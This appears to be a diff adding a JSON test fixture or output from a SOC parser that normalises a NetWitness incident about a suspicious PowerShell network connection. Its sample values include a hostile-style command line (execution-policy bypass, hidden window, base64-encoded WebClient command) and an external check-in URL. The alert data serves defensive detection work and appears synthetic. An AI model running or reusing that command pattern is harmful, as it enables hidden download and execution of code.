@@ -1,0 +1,542 @@
+{
+    "parser": "soc_netwitness_parser",
+    "parser_version": "3.3-soc-normalised",
+    "input_format": "full_incident_export",
+    "selected_alert_index": 0,
+    "selected_alert_id": "NW-ALERT-9102-A",
+    "selected_alert_raw_evidence": {
+        "raw_meta_key_count": 84,
+        "field_evidence_paths": {
+            "incident_id": [
+                "incident.id"
+            ],
+            "incident_title": [
+                "incident.title"
+            ],
+            "incident_priority": [
+                "incident.priority"
+            ],
+            "incident_risk_score": [
+                "incident.riskScore",
+                "incident.averageAlertRiskScore"
+            ],
+            "incident_first_alert_time": [
+                "incident.firstAlertTime"
+            ],
+            "alert_id": [
+                "alert._id",
+                "alert.originalAlert.events[0].event_source_id",
+                "alert.originalAlert.events[1].community_id",
+                "alert.originalAlert.events[1].event_source_id",
+                "alert.originalAlert.events[2].event_source_id"
+            ],
+            "alert_name": [
+                "alert.originalHeaders.name",
+                "alert.originalAlert.moduleName",
+                "incident.title",
+                "alert.originalAlert.events[0].filename",
+                "alert.originalAlert.events[0].process_name",
+                "alert.originalAlert.events[0].parent_process_name",
+                "alert.originalAlert.events[2].filename",
+                "alert.related_links[0].name"
+            ],
+            "alert_time": [
+                "alert.receivedTime",
+                "alert.originalHeaders.timestamp",
+                "alert.originalAlert.time",
+                "alert.originalAlert.events[0].time",
+                "alert.originalAlert.events[1].time",
+                "alert.originalAlert.events[2].time",
+                "incident.firstAlertTime"
+            ],
+            "severity": [
+                "alert.originalHeaders.severity",
+                "alert.originalAlert.severity",
+                "incident.priority",
+                "incident.riskScore",
+                "incident.averageAlertRiskScore"
+            ],
+            "risk_score": [
+                "incident.riskScore",
+                "incident.averageAlertRiskScore"
+            ],
+            "event_type": [
+                "alert.originalHeaders.deviceProduct",
+                "alert.originalAlert.events[0].type",
+                "alert.originalAlert.events[0].event_type",
+                "alert.originalAlert.events[1].type",
+                "alert.originalAlert.events[1].event_type",
+                "alert.originalAlert.events[2].type",
+                "alert.originalAlert.events[2].event_type"
+            ],
+            "detection_name": [
+                "alert.originalHeaders.name",
+                "alert.originalAlert.moduleName"
+            ],
+            "signature_id": [
+                "alert.originalHeaders.signatureId"
+            ],
+            "source_ip": [
+                "incident.alertMeta.SourceIp[0]",
+                "alert.originalAlert.events[0].ip_src",
+                "alert.originalAlert.events[1].ip_src"
+            ],
+            "destination_ip": [
+                "incident.alertMeta.DestinationIp[0]",
+                "alert.originalAlert.events[0].ip_dst",
+                "alert.originalAlert.events[1].ip_dst"
+            ],
+            "source_port": [
+                "alert.originalAlert.events[0].tcp_srcport",
+                "alert.originalAlert.events[1].tcp_srcport"
+            ],
+            "destination_port": [
+                "alert.originalAlert.events[0].tcp_dstport",
+                "alert.originalAlert.events[1].tcp_dstport"
+            ],
+            "protocol": [
+                "alert.originalAlert.events[0].protocol",
+                "alert.originalAlert.events[1].protocol"
+            ],
+            "direction": [
+                "alert.originalAlert.events[0].direction",
+                "alert.originalAlert.events[1].direction"
+            ],
+            "community_id": [
+                "alert.originalAlert.events[1].community_id"
+            ],
+            "session_id": [
+                "alert.originalAlert.events[0].sessionid",
+                "alert.originalAlert.events[1].sessionid",
+                "alert.originalAlert.events[2].sessionid"
+            ],
+            "event_source_id": [
+                "alert.originalAlert.events[0].event_source_id",
+                "alert.originalAlert.events[1].event_source_id",
+                "alert.originalAlert.events[2].event_source_id"
+            ],
+            "record_id": [
+                "alert.originalAlert.events[0].rid",
+                "alert.originalAlert.events[1].rid",
+                "alert.originalAlert.events[2].rid"
+            ],
+            "username": [
+                "alert.originalAlert.events[0].username[0]",
+                "alert.originalAlert.events[1].username[0]",
+                "alert.originalAlert.events[2].username[0]"
+            ],
+            "hostname": [
+                "alert.originalAlert.events[0].alias_host[0]",
+                "alert.originalAlert.events[1].alias_host[0]",
+                "alert.originalAlert.events[2].alias_host[0]"
+            ],
+            "domain": [
+                "alert.originalAlert.events[0].domain"
+            ],
+            "file_name": [
+                "alert.originalAlert.events[0].filename",
+                "alert.originalAlert.events[2].filename"
+            ],
+            "file_hash": [
+                "alert.originalAlert.events[2].sha256",
+                "alert.originalAlert.events[2].sha1",
+                "alert.originalAlert.events[2].md5"
+            ],
+            "file_size": [
+                "alert.originalAlert.events[2].size"
+            ],
+            "mitre_tactic": [
+                "alert.originalAlert.events[0].attack_tactic"
+            ],
+            "mitre_technique": [
+                "alert.originalAlert.events[0].attack_technique"
+            ],
+            "mitre_technique_id": [
+                "alert.originalAlert.events[0].attack_tid"
+            ],
+            "risk_indicator": [
+                "alert.originalAlert.events[0].risk_suspicious[0]",
+                "alert.originalAlert.events[0].risk_suspicious[1]",
+                "alert.originalAlert.events[0].risk_suspicious[2]"
+            ],
+            "network_risk_info": [
+                "alert.originalAlert.events[1].risk_info[0]",
+                "alert.originalAlert.events[1].risk_info[1]"
+            ],
+            "url": [
+                "alert.originalAlert.events[1].url",
+                "alert.related_links[0].url"
+            ],
+            "user_agent": [
+                "alert.originalAlert.events[1].user_agent"
+            ],
+            "event_time": [
+                "alert.originalAlert.events[0].time",
+                "alert.originalAlert.events[1].time",
+                "alert.originalAlert.events[2].time",
+                "incident.firstAlertTime",
+                "alert.receivedTime",
+                "alert.originalAlert.time",
+                "alert.originalHeaders.timestamp"
+            ],
+            "process_name": [
+                "alert.originalAlert.events[0].process_name",
+                "alert.originalAlert.events[0].parent_process_name"
+            ],
+            "parent_process_name": [
+                "alert.originalAlert.events[0].parent_process_name"
+            ],
+            "command_line": [
+                "alert.originalAlert.events[0].command_line"
+            ]
+        },
+        "sample_values": {
+            "incident_id": [
+                "INC-9102"
+            ],
+            "incident_title": [
+                "Suspicious PowerShell Network Connection"
+            ],
+            "incident_priority": [
+                "Critical"
+            ],
+            "incident_risk_score": [
+                92
+            ],
+            "incident_first_alert_time": [
+                1768670419000
+            ],
+            "alert_id": [
+                "NW-ALERT-9102-A",
+                "ES-Endpoint-07",
+                "1:abc9102xyz",
+                "ES-Network-Proxy-02"
+            ],
+            "alert_name": [
+                "PowerShell Encoded Command with External Connection",
+                "Suspicious Endpoint Behaviour",
+                "Suspicious PowerShell Network Connection",
+                "powershell.exe",
+                "explorer.exe",
+                "update_cache.tmp",
+                "NetWitness Investigation"
+            ],
+            "alert_time": [
+                1768670419000,
+                1768670479000,
+                1768670539000
+            ],
+            "severity": [
+                "Critical",
+                92
+            ],
+            "risk_score": [
+                92
+            ],
+            "event_type": [
+                "NetWitness Endpoint",
+                "endpoint",
+                "process_creation",
+                "network",
+                "http_connection",
+                "file_write"
+            ],
+            "detection_name": [
+                "PowerShell Encoded Command with External Connection",
+                "Suspicious Endpoint Behaviour"
+            ],
+            "signature_id": [
+                "SIG-PS-ENCODED-443"
+            ],
+            "source_ip": [
+                "10.100.30.25"
+            ],
+            "destination_ip": [
+                "91.234.55.66"
+            ],
+            "source_port": [
+                50444,
+                50445
+            ],
+            "destination_port": [
+                443
+            ],
+            "protocol": [
+                "HTTPS"
+            ],
+            "direction": [
+                "outbound"
+            ],
+            "community_id": [
+                "1:abc9102xyz"
+            ],
+            "session_id": [
+                "SID-9102-001",
+                "SID-9102-002",
+                "SID-9102-003"
+            ],
+            "event_source_id": [
+                "ES-Endpoint-07",
+                "ES-Network-Proxy-02"
+            ],
+            "record_id": [
+                "RID-772910",
+                "RID-772911",
+                "RID-772912"
+            ],
+            "username": [
+                "nurul_a"
+            ],
+            "hostname": [
+                "RPSOCWSWin7"
+            ],
+            "domain": [
+                "RP-SOC"
+            ],
+            "file_name": [
+                "powershell.exe",
+                "update_cache.tmp"
+            ],
+            "file_hash": [
+                "8f14e45fceea167a5a36dedd4bea2543a1234567890abcdef1234567890abcd",
+                "a9993e364706816aba3e25717850c26c9cd0d89d",
+                "098f6bcd4621d373cade4e832627b4f6"
+            ],
+            "file_size": [
+                48291
+            ],
+            "mitre_tactic": [
+                "Execution"
+            ],
+            "mitre_technique": [
+                "Command and Scripting Interpreter: PowerShell"
+            ],
+            "mitre_technique_id": [
+                "T1059.001"
+            ],
+            "risk_indicator": [
+                "Encoded PowerShell command",
+                "Hidden PowerShell window",
+                "Outbound connection to external IP"
+            ],
+            "network_risk_info": [
+                "Suspicious PowerShell user agent",
+                "External HTTPS check-in"
+            ],
+            "url": [
+                "https://cdn-update-checker.net/api/v2/checkin",
+                "/investigation/navigate/query/INC-9102"
+            ],
+            "user_agent": [
+                "Mozilla/5.0 WindowsPowerShell/5.1"
+            ],
+            "event_time": [
+                1768670419000,
+                1768670479000,
+                1768670539000
+            ],
+            "process_name": [
+                "powershell.exe",
+                "explorer.exe"
+            ],
+            "parent_process_name": [
+                "explorer.exe"
+            ],
+            "command_line": [
+                "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA="
+            ]
+        },
+        "event_evidence_paths": {
+            "event_0": {
+                "source_path": "originalAlert.events[0]",
+                "field_evidence_paths": {
+                    "alert_id": [
+                        "event.event_source_id"
+                    ],
+                    "alert_name": [
+                        "event.filename",
+                        "event.process_name",
+                        "event.parent_process_name"
+                    ],
+                    "alert_time": [
+                        "event.time"
+                    ],
+                    "event_type": [
+                        "event.type",
+                        "event.event_type"
+                    ],
+                    "source_ip": [
+                        "event.ip_src"
+                    ],
+                    "destination_ip": [
+                        "event.ip_dst"
+                    ],
+                    "source_port": [
+                        "event.tcp_srcport"
+                    ],
+                    "destination_port": [
+                        "event.tcp_dstport"
+                    ],
+                    "protocol": [
+                        "event.protocol"
+                    ],
+                    "direction": [
+                        "event.direction"
+                    ],
+                    "session_id": [
+                        "event.sessionid"
+                    ],
+                    "event_source_id": [
+                        "event.event_source_id"
+                    ],
+                    "record_id": [
+                        "event.rid"
+                    ],
+                    "hostname": [
+                        "event.alias_host[0]"
+                    ],
+                    "domain": [
+                        "event.domain"
+                    ],
+                    "file_name": [
+                        "event.filename"
+                    ],
+                    "mitre_tactic": [
+                        "event.attack_tactic"
+                    ],
+                    "mitre_technique": [
+                        "event.attack_technique"
+                    ],
+                    "mitre_technique_id": [
+                        "event.attack_tid"
+                    ],
+                    "risk_indicator": [
+                        "event.risk_suspicious[0]",
+                        "event.risk_suspicious[1]",
+                        "event.risk_suspicious[2]"
+                    ],
+                    "event_time": [
+                        "event.time"
+                    ],
+                    "process_name": [
+                        "event.process_name",
+                        "event.parent_process_name"
+                    ],
+                    "parent_process_name": [
+                        "event.parent_process_name"
+                    ],
+                    "command_line": [
+                        "event.command_line"
+                    ]
+                }
+            },
+            "event_1": {
+                "source_path": "originalAlert.events[1]",
+                "field_evidence_paths": {
+                    "alert_id": [
+                        "event.community_id",
+                        "event.event_source_id"
+                    ],
+                    "alert_time": [
+                        "event.time"
+                    ],
+                    "event_type": [
+                        "event.type",
+                        "event.event_type"
+                    ],
+                    "source_ip": [
+                        "event.ip_src"
+                    ],
+                    "destination_ip": [
+                        "event.ip_dst"
+                    ],
+                    "source_port": [
+                        "event.tcp_srcport"
+                    ],
+                    "destination_port": [
+                        "event.tcp_dstport"
+                    ],
+                    "protocol": [
+                        "event.protocol"
+                    ],
+                    "direction": [
+                        "event.direction"
+                    ],
+                    "community_id": [
+                        "event.community_id"
+                    ],
+                    "session_id": [
+                        "event.sessionid"
+                    ],
+                    "event_source_id": [
+                        "event.event_source_id"
+                    ],
+                    "record_id": [
+                        "event.rid"
+                    ],
+                    "hostname": [
+                        "event.alias_host[0]"
+                    ],
+                    "network_risk_info": [
+                        "event.risk_info[0]",
+                        "event.risk_info[1]"
+                    ],
+                    "url": [
+                        "event.url"
+                    ],
+                    "user_agent": [
+                        "event.user_agent"
+                    ],
+                    "event_time": [
+                        "event.time"
+                    ]
+                }
+            },
+            "event_2": {
+                "source_path": "originalAlert.events[2]",
+                "field_evidence_paths": {
+                    "alert_id": [
+                        "event.event_source_id"
+                    ],
+                    "alert_name": [
+                        "event.filename"
+                    ],
+                    "alert_time": [
+                        "event.time"
+                    ],
+                    "event_type": [
+                        "event.type",
+                        "event.event_type"
+                    ],
+                    "session_id": [
+                        "event.sessionid"
+                    ],
+                    "event_source_id": [
+                        "event.event_source_id"
+                    ],
+                    "record_id": [
+                        "event.rid"
+                    ],
+                    "hostname": [
+                        "event.alias_host[0]"
+                    ],
+                    "file_name": [
+                        "event.filename"
+                    ],
+                    "file_hash": [
+                        "event.sha256",
+                        "event.sha1",
+                        "event.md5"
+                    ],
+                    "file_size": [
+                        "event.size"
+                    ],
+                    "event_time": [
+                        "event.time"
+                    ]
+                }
+            }
+        }
+    },
+    "generated_at": "2026-05-30T11:33:42.133821+00:00"
+}
